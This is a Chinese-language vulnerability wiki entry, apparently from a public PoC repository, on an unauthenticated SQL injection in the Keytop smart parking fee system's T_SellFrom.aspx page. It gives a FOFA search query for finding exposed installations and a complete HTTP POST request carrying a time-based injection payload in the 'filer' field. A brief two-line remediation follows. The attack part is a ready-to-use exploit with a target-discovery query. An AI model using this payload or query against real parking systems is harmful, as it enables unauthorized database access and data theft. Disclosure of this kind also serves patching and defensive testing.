---
fofa: "body="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

#  科拓全智能停车收费系统 T_SellFrom.aspx SQL注入漏洞 

# 漏洞描述

科拓全智能停车收费系统 T_SellFrom.aspx SQL注入漏洞，未授权的攻击者可执行恶意sql语句导致服务器数据库信息泄露甚至被攻陷。

# 影响版本

科拓全智能停车收费系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/KT_Css/qd_defaul.css"

```
POST /KT_Admin/SellManage/T_SellFrom.aspx HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

start=0&limit=20&filer=1;SELECT SLEEP(5)#

```

![image-20250326110157257](./.resource/科拓全智能停车收费系统T_SellFrom.aspxSQL注入漏洞/media/image-20250326110157257.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
